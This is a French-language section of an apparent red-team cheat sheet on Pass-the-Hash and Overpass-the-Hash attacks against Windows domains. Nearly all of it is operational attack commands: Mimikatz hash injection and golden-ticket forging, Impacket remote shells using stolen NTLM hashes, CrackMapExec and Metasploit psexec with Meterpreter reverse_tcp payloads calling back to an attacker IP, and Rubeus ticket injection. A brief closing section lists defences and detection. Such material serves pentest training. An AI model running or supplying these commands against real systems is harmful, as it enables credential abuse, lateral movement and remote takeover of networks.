# VI.A. Pass-the-Hash (PtH) / Overpass-the-Hash (OtH)

Pass-the-Hash (PtH) est une technique qui permet à un attaquant de s'authentifier sur un système distant en utilisant le hash NTLM du mot de passe d'un utilisateur, au lieu du mot de passe en clair. Overpass-the-Hash (OtH) est une variante où le hash NTLM est utilisé pour obtenir un ticket Kerberos (TGT), qui est ensuite utilisé pour l'authentification (essentiellement PtH vers Kerberos).

## Prérequis
*   Obtention d'un hash NTLM d'un utilisateur (via dump de LSASS, SAM, DCSync, etc.).
*   L'utilisateur dont le hash est utilisé doit avoir des droits d'accès (souvent admin local) sur la machine cible.
*   Le protocole NTLM doit être utilisable pour l'authentification sur la machine cible.

## 1. Pass-the-Hash (PtH)

Utilise directement le hash NTLM pour s'authentifier via le protocole NTLM.

*   **Outils et Commandes :**

    *   **Mimikatz (Windows) :**
        ```
        privilege::debug
        # Lancer une nouvelle session avec le hash
        sekurlsa::pth /user:<NOM_UTILISATEUR> /domain:<NOM_DOMAINE> /ntlm:<HASH_NTLM> /run:"cmd.exe"
        # Cela ouvre un nouveau cmd.exe dans le contexte de l'utilisateur.
        # À partir de ce cmd, vous pouvez accéder aux ressources distantes :
        # dir \\<MACHINE_CIBLE>\C$
        # psexec.exe \\<MACHINE_CIBLE> cmd.exe
        ```

    *   **Impacket (Linux - psexec.py, smbexec.py, wmiexec.py, dcomexec.py) :**
        Ces outils permettent d'exécuter des commandes ou d'obtenir un shell sur une machine distante en utilisant le hash.
        ```bash
        # PsExec-like (shell interactif)
        psexec.py <DOMAINE>/<UTILISATEUR>@<IP_CIBLE> -hashes <LM_HASH>:<NT_HASH>
        # Si LM_HASH n'est pas connu (souvent le cas), utiliser une chaîne vide ou aad3b435b51404eeaad3b435b51404ee
        psexec.py <DOMAINE>/<UTILISATEUR>@<IP_CIBLE> -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>

        # Exécuter une commande unique avec smbexec.py
        smbexec.py <DOMAINE>/<UTILISATEUR>@<IP_CIBLE> -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> -C "whoami"

        # Shell interactif avec wmiexec.py
        wmiexec.py <DOMAINE>/<UTILISATEUR>@<IP_CIBLE> -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
        ```

    *   **CrackMapExec (Linux) :**
        Peut utiliser des hashes pour s'authentifier et exécuter des modules.
        ```bash
        crackmapexec smb <IP_CIBLE_OU_PLAGE> -u <UTILISATEUR> -H <NT_HASH> -d <DOMAINE> -x "whoami"
        # Pour obtenir un shell Meterpreter (si un listener est configuré)
        # crackmapexec smb <IP_CIBLE> -u <UTILISATEUR> -H <NT_HASH> -d <DOMAINE> -M metinject -o LHOST=<IP_ATTAQUANT> LPORT=<PORT>
        ```

    *   **Metasploit Framework (module `exploit/windows/smb/psexec`) :**
        Ce module supporte l'utilisation de hashes.
        ```
        msfconsole
        use exploit/windows/smb/psexec
        set RHOSTS <IP_CIBLE>
        set SMBUser <UTILISATEUR>
        set SMBPass <NT_HASH>  # Metasploit gère le format LM:NT, si LM est vide, il le mettra.
        # ou set SMBPass aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
        set SMBDomain <DOMAINE>
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        set LHOST <IP_ATTAQUANT>
        exploit
        ```

## 2. Overpass-the-Hash (OtH) / Pass-the-Key

Utilise le hash NTLM pour demander un TGT Kerberos, puis utilise ce TGT pour s'authentifier (Pass-the-Ticket).

*   **Outils et Commandes :**

    *   **Mimikatz (Windows) :**
        ```
        privilege::debug
        # Demander un TGT en utilisant le hash NTLM
        sekurlsa::pth /user:<NOM_UTILISATEUR> /domain:<NOM_DOMAINE_FQDN> /ntlm:<HASH_NTLM> /run:"cmd.exe"
        # Dans le nouveau cmd.exe, les tickets Kerberos sont disponibles.
        # klist (pour voir les tickets)
        # dir \\<MACHINE_CIBLE_FQDN>\C$
        ```
        Alternativement, pour injecter directement un TGT forgé avec le hash (AES Key si disponible est mieux) :
        ```
        # Si vous avez la clé AES256 du compte (obtenue via DCSync par exemple)
        kerberos::golden /user:<NOM_UTILISATEUR> /domain:<NOM_DOMAINE_FQDN> /sid:<SID_DOMAINE> /aes256:<CLE_AES256> /ptt
        # Ou avec le hash NTLM (moins fiable pour forger des TGTs directement, mais Mimikatz peut tenter)
        # kerberos::golden /user:<NOM_UTILISATEUR> /domain:<NOM_DOMAINE_FQDN> /sid:<SID_DOMAINE> /rc4:<HASH_NTLM> /ptt
        # Après /ptt, le ticket est dans la session actuelle.
        ```

    *   **Rubeus (Windows) :**
        Rubeus est excellent pour les opérations Kerberos.
        ```powershell
        # Demander un TGT en utilisant le hash NTLM (RC4)
        Rubeus.exe asktgt /user:<UTILISATEUR> /domain:<DOMAINE_FQDN> /rc4:<HASH_NTLM> /ptt
        # Ou avec une clé AES (préférable si disponible)
        # Rubeus.exe asktgt /user:<UTILISATEUR> /domain:<DOMAINE_FQDN> /aes256:<CLE_AES256> /ptt

        # Après /ptt, le ticket est injecté dans la session actuelle.
        # klist
        # dir \\<MACHINE_CIBLE_FQDN>\C$
        ```

## Considérations
*   **Restricted Admin Mode (pour RDP) :** Si le "Restricted Admin Mode" est activé sur la machine cible et que l'attaquant utilise PtH pour une connexion RDP, les credentials ne sont pas exposés sur la machine cible. Cependant, cela nécessite des droits d'admin local.
*   **Protection LSA (RunAsPPL) :** Peut empêcher l'accès direct à LSASS et donc le dump de hashes. Des contournements peuvent exister (ex: via un driver malveillant).
*   **Microsoft Defender for Identity (anciennement Azure ATP) et autres EDRs :** Peuvent détecter les activités PtH/OtH.
*   **Net-NTLMv1/v2 Downgrade :** PtH repose sur NTLM. Si NTLM est désactivé au profit de Kerberos uniquement, PtH direct ne fonctionnera pas, mais OtH (via Rubeus `asktgt` avec le hash) peut toujours être possible.

Le PtH et l'OtH sont des techniques fondamentales pour le mouvement latéral dans les environnements Windows. 